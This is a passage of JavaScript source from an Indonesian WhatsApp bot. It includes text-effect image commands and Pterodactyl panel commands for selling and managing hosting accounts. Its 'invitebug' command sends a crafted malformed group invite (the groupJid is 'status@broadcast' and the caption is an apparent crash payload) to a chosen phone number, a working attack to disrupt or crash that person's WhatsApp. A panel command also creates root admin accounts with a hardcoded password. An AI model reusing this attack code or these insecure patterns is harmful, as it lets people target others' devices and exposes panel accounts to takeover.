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',
"mediaType": 1,
"previewType": "PHOTO",
"renderLargerThumbnail": true,
"caption": `Terima undangan ini untuk menjadi admin di saluran WhatsApp saya\n\n${global.saluran}`,
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": 9999999999999
}
}), m.quoted && m.quoted.fromMe ? {
contextInfo: {
	...m.msg.contextInfo,
}
} : {quoted:fpayment2})
znn.relayMessage(from, newsletterAdminInviteMessage.message, { messageId: newsletterAdminInviteMessage.key.id })
break

















































// FITUR PHOTOOXY
case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':
{
if (!isGroup) return onlyGroup()
reply(mess.wait)
//  if (!isPrem) return replyprem(mess.premium);
if (!q) return reply(`Example : ${prefix + command} Kayla`);
let link;
if (/stonetext/.test(command))
link =
  'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
if (/writeart/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
if (/summertext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
if (/wolfmetaltext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
if (/nature3dtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
if (/rosestext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
if (/naturetypography/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
if (/quotesunder/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
if (/shinetext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
if (/shadow/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
if (/write/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
if (/romantic/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
if (/burnpaper/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
if (/smoke/.test(command))
link =
  'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
if (/narutobanner/.test(command))
link =
  'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
if (/love/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
if (/undergrass/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
if (/doublelove/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html';
if (/coffecup/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
if (/underwaterocean/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
if (/smokyneon/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
if (/starstext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
if (/rainboweffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
if (/balloontext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
if (/metalliceffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
if (/embroiderytext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
if (/flamingtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
let dehe = await photooxy.photoOxy(link, q);
znn.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `Powered By znn`},
{ quoted: m }
);
}
break;































































// FITUR BUG
case 'invitebug': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283148278021`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: znn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "status@broadcast",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": 9999999999,
"groupName": `Powered By Project znnzation`,
"caption": `${ngazap}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:floc})
znn.relayMessage(bnnd, groupInvite.message, { messageId: groupInvite.key.id })
reply(`Sukses Mengirim Bug Ke ${bnnd} !!!`)
}
break













































































































// FITUR PANEL
case 'addusradmin': {
if (!isCreator) return reply(mess.owner)
let t = q.split(',');
if (t.length < 3) return reply795(`${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let passwordnya = 'AdminUser123'
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply795(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": passwordnya
})
})
let data = await f.json();
if (data.errors) return reply795(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes

let p = await reply795(`
*USER SUKSES DIBUAT*

id: ${user.id}
username: ${user.username}
email: ${user.email}
name: ${user.first_name} ${user.last_name}
bahasa: ${user.language}
admin: ${user.root_admin}
created at: ${user.created_at}

detail user @${u.split`@`[0]} dikirim\ndi private chat, harap lihat!`)
znn.sendMessage(u, { text: `*THIS YOUR ACCOUNT*

email: ${email}
username: ${username}
password: ${passwordnya}
login: ${global.domain}

ketik *buyserver* untuk membeli server!`,
}).catch((err) => reply795(`*DETAIL ACCOUNT*

email : ${email}
username : ${username}
password : ${passwordnya}
login : ${global.domain}`))
}
break
case 'listusr': {
let page = args[0] ? args[0] : '1'
let f = await fetch(global.domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let res = await f.json();
let users = res.data
let sections = "*DATA USER PANEL*"
for (let user of users) {
let u = user.attributes
sections += `\n\n*${u.id}. ${u.username}*\n *User :* ${u.first_name} ${u.last_name}\n *Admin :* ${u.root_admin}\n *Bahasa :* ${u.language}`
}
znn.sendMessage(from, {
document: trash,
fileName: 'Panel Pterodactyl',
mimetype: doc3,
fileLength: 999999999,
pageCount: '2024',
caption: sections.trim(),
contextInfo: {
externalAdReply: {  
title: `L I S T   U S E R`, 
body: 'znn project [v.1.5]',
thumbnailUrl: "https://telegra.ph/file/fa753d99143e66c7fcf99.png", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted:fkontak2})
}
break
case "listsrv": {
let page = args[0] ? args[0] : '1'
let f = await fetch(global.domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let res = await f.json();
let servers = res.data
let sections = "*DATA SERVER PANEL*"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apicred
}
})
let data = await f3.json();

sections += `\n\n*${s.id}.* Server : ${s.name}`
}
znn.sendMessage(from, {
document: trash,
fileName: 'Panel Pterodactyl',
mimetype: doc3,
fileLength: 999999999,
pageCount: '2024',
caption: sections.trim(),
contextInfo: {
externalAdReply: {  
title: `L I S T   S E R V E R`, 
body: 'znn project [v.1.5]',
thumbnailUrl: "https://telegra.ph/file/fa753d99143e66c7fcf99.png", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted:fkontak2})
}
break
case 'addusr': {
if (cekSaldo(sender,db_saldo) < 3000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 3,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
    
let t = q.split(',');
if (t.length < 3) return reply795(`${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
//let password
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply795(`*PENGGUNAAN SALAH [!]*

Isi Data Anda Disini
${prefix + command} name@gmail.com,name,number\n\ncontoh : addusr znn@gmail.com,znn,${nomore}`);
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Member",
"root_admin": false,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes

let p = await znn.sendMessage(m.chat, { text: `
*USER SUKSES DIBUAT*

id: ${user.id}
username: ${user.username}
email: ${user.email}
name: ${user.first_name} ${user.last_name}
bahasa: ${user.language}
admin: ${user.root_admin}
created at: ${user.created_at}

detail user @${u.split`@`[0]} dikirim\ndi private chat, harap lihat!`, mentions:[u],
}, {quoted: m})
znn.sendMessage(u, { text: `*THIS YOUR ACCOUNT*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}

ketik *buyserver* untuk membeli server!`,
}).catch((err) => reply795(`*DETAIL ACCOUNT*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(4000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 3,000`)
minSaldo(sender, 3000, db_saldo)
break
case 'addsrv': {
if (cekSaldo(sender,db_saldo) < 10000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 10,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let s = q.split(',');
if (s.length < 7) return reply795(`Format salah! silahkan isi data di bawah\nname,desc,userId,egg,locId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(global.domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data = await f1.json();
//console.log(data.attributes.startup)
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18", // Docker sesuaikan kaya yang ada di panel create srv manual dulu lihat dockernya apa taruh disini contoh: jika terdapat "Java 17 (ghcr.io/pterodactyl/yolks:java_17)" maka salin aja dan tempel "ghcr.io/pterodactyl/yolks:java_17"
"startup": startup_cmd,
"environment": {
/*"INST": "npm install",*/ //Buka ini jika di panel ada Startup Install nya Jika tidak ada maka sembunyikan kaya gini aja
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
// "allocation": {
// "default": 36
// }
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply795(`*SUCCESS CREATE SERVER*

*ID : ${server.id}*
UUID : ${server.uuid}
NAME : ${server.name}
DESC : ${server.description}
DISK : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
CPU : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
DATE : ${server.created_at}`)
}
break
case 'delsrv': {
if (!isCreator) return reply('cannot access')
let srv = args[0]
if (!srv) return reply795('Input *ID* Server')
let f = await fetch(global.domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply795('*NOT FOUND [!]*')
reply('*SERVER DI HAPUS [!]*')
}
break
case 'delusr': {
if (!isCreator) return reply('this for creator')
let usr = args[0]
if (!usr) return reply795('Input User *ID*')
let f = await fetch(global.domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
//let res = await f.json()
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply795('*NOT FOUND*')
reply(`*${usr} DELETED*`)
}
break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
let srv = args[0]
if (!srv) return reply795('input *ID* from server')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"signal": action
})
})

let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`Sukses ${action.toUpperCase()} Server`)
}
break // Powered By Winn
case 'buyserver':
let hargasrv = `*INFO ANDA*

  Name : ${pushname}
  Nomor : ${tag}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
Lakukan pembelian secara otomatis

${prefix}1GB Nama,Nomor   > Rp. 1,500
${prefix}2GB Nama,Nomor   > Rp. 2,000
${prefix}4GB Nama,Nomor   > Rp. 3,000
${prefix}4GB Nama,Nomor   > Rp. 4,000
${prefix}5GB Nama,Nomor   > Rp. 5,000
${prefix}6GB Nama,Nomor   > Rp. 6,000
${prefix}7GB Nama,Nomor   > Rp. 7,000
${prefix}8GB Nama,Nomor   > Rp. 8,000
${prefix}9GB Nama,Nomor   > Rp. 9,000
${prefix}0GB Nama,Nomor   > Rp. 15.000

Contoh cara penggunaan
 Example : 1gb ${pushname},${nomore}

masukan nama dan nomor anda dengan koma ( , ) sebagai pemisah`
reply795(hargasrv)
break

case "1gb": {
if (cekSaldo(sender,db_saldo) < 1500) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 1,500 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 1gb"
let egg = global.eggsnya
let loc = global.location
let memo = "1200"
let cpu = "30"
let disk = "1200"
let email = username + "1gb@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
const Kalender91 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${Kalender91}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${Kalender91}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(4000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 1,500`)
minSaldo(sender, 1500, db_saldo)
break
case "2gb": {
if (cekSaldo(sender,db_saldo) < 2500) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 2,500 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 2gb"
let egg = global.eggsnya
let loc = global.location
let memo = "2200"
let cpu = "40"
let disk = "2200"
let email = username + "2gb@gmail.com"
if (!u) return
let d = (await znn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}

*YOUR PANEL*

  ID : ${user.id}
  Username : ${user.username}
  Email : ${user.email}
  Name : ${user.first_name} ${user.last_name}
  Bahasa : ${user.language}
  Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

znn.sendMessage(u, { text: `*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*YOUR PANEL*

  email: ${email}
  username: ${username}
  password: ${password.toString()}
  login: ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
*SUCCESS PAID*

email: ${email}
username: ${username}
password: ${password.toString()}
login: ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 2,500`)
minSaldo(sender, 2500, db_saldo)
